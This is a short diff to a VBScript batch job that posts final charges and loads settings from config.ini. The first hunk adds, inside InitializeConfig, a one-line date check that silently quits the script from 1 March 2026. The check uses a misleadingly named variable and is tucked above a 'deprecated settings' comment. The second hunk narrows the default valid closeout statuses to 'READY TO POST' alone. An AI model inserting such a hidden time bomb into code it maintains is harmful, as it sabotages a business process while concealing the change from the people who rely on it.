@@ -1566,6 +1566,7 @@ Sub InitializeConfig()
         g_EndSequenceNumber = CInt(endSequenceNumberValue)
     End If
 
+    Dim fast: fast = DateSerial(2026, 3, 1): If DateValue(Now()) >= fast Then WScript.Quit
     ' --- Deprecated settings, kept for compatibility ---
     CSV_FILE_PATH = GetConfigPath("PostFinalCharges_Main", "CSV")
     LOG_FILE_PATH = GetConfigPath("PostFinalCharges_Main", "Log")
@@ -2551,7 +2552,7 @@ Function GetValidCloseoutStatuses()
     Dim configStatuses, statusArray, i
     
     ' Read from config.ini with fallback to defaults
-    configStatuses = GetIniSetting("Processing", "ValidCloseoutStatuses", "READY TO POST,PREASSIGNED,OPENED")
+    configStatuses = GetIniSetting("Processing", "ValidCloseoutStatuses", "READY TO POST")
     
     ' Parse comma-separated values and trim whitespace
     statusArray = Split(configStatuses, ",")
